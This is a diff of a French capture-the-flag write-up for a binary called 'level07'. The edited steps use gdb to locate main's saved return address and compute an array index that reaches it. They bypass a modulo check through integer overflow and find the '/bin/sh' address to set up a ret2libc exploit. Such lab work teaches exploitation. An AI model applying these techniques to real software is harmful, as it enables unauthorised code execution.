@@ -46,22 +46,21 @@ Continuing.
 
 4294956356 = 0xffffd544 donc tout est bon.
 
-On récupère maintenant l'index de l'EIP de la fonction read_number:
+On récupère maintenant l'index de l'EIP de la fonction main:
 
-(gdb) b *main+520
-Breakpoint 2 at 0x804892b
+(gdb) b main
+Breakpoint 1 at 0x8048729
 (gdb) r
-...
-Input command: read
+Starting program: /home/users/level07/level07
 
-Breakpoint 2, 0x0804892b in main ()
+Breakpoint 1, 0x08048729 in main ()
 (gdb) i f
 Stack level 0, frame at 0xffffd710:
- eip = 0x804892b in main; saved eip 0xf7e45513
+ eip = 0x8048729 in main; saved eip 0xf7e45513
  Arglist at 0xffffd708, args:
  Locals at 0xffffd708, Previous frame's sp is 0xffffd710
  Saved registers:
-  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c
+  ebp at 0xffffd708, eip at 0xffffd70c
 
 L'adresse de l'EIP est donc: 0xffffd70c
 On récupère son index dans le tableau: 0xffffd70c - 0xffffd544 = 0x1C8 = 456, /4 car tableau d'int = 114.
@@ -98,12 +97,13 @@ All functions matching regular expression "system":
 
 114 % 3 étant égale à 0 il nous faut bypass la protection, ce qui est possible avec un overflow: (UINT_MAX/4) + 114 = 1073741938, cet overflow nous permettra d'obtenir 114 tout en passant la protection car 1073741938 % 3 = 1
 
+L'overflow est possible grace au *4: *(uint *)(uVar2 * 4 + param_1) = uVar1;
+
 On récupère l'adresse de /bin/sh:
 gdb ./level07
 (gdb) b *main
 (gdb) r
-(gdb) info proc map
-(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
+(gdb) find &system,+9999999,"/bin/sh"
 -> 0xf7f897ec = 4160264172
 
 On à maintenant tout les éléments pour effectuer un ret2libc:
